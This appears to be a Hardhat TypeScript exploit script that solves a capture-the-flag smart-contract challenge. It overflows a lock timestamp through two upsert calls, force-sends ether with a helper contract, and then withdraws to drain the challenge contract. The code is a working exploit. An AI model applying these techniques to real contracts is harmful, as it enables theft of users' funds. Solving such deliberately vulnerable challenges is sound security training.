// eslint-disable-next-line node/no-extraneous-import
import { BigNumber } from "@ethersproject/bignumber";
import { ethers } from "hardhat";

const BN = ethers.BigNumber;

const myAddress = "0xD028d504316FEc029CFa36bdc3A8f053F6E5a6e4";
const challengeAddress = "0x070b3b24C9f593180981a59541E6262765276A79";
const MAX_INT256 = BN.from("2").pow(BN.from("256")).sub(BN.from("1"));

const abi = [
  "function upsert(uint256 index, uint256 timestamp) external payable",
  "function withdraw(uint256 index) external",
  "function isComplete() external view returns (bool)",
];

const upsertContractCall =
  (contract: any) =>
  async ({
    index,
    timestamp,
    value,
  }: {
    index: number;
    timestamp: BigNumber;
    value: number;
  }) => {
    console.log("Executing transaction:");
    console.log(`index: ${index}`);
    console.log(`timestamp: ${timestamp}`);
    console.log(`value: ${value}`);
    const tx = await contract.upsert(index, timestamp, {
      value: value,
    });
    return tx.wait();
  };

const attack = async () => {
  const signer = await ethers.getSigner(myAddress);
  const contract = new ethers.Contract(challengeAddress, abi, signer);
  const upsert = upsertContractCall(contract);
  const isCompleteStart = await contract.isComplete();
  console.log(`isCompleteStart: ${isCompleteStart}`);

  const secondsInOneDay = 60 * 60 * 24;
  const tx1 = await upsert({
    index: 1,
    timestamp: MAX_INT256.sub(secondsInOneDay).add(BN.from("1")),
    value: 1,
  });
  console.log("First upsert tx done");
  console.log(tx1);

  const tx2 = await upsert({
    index: 2,
    timestamp: BN.from("0"),
    value: 2,
  });
  console.log(tx2);
  console.log("Second upsert tx done");
  // need to send some more value to the contract so the withdraw does not fail
  const ForceSendEthFactory = await ethers.getContractFactory("ForceSendEth");
  const forceSendEthContract = await ForceSendEthFactory.deploy(
    challengeAddress,
    {
      value: 2, // (queue[0].amount + queue[1].amount + queue[2].amount) - contract balance / (1000000000000000005) - 1000000000000000003 = 2
    }
  );

  await forceSendEthContract.deployed();

  const tx3 = await contract.withdraw(2);
  await tx3.wait();
  console.log(tx3);

  const isCompleteEnd = await contract.isComplete();
  console.log(`isCompleteEnd: ${isCompleteEnd}`);
};

async function main() {
  await attack();
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
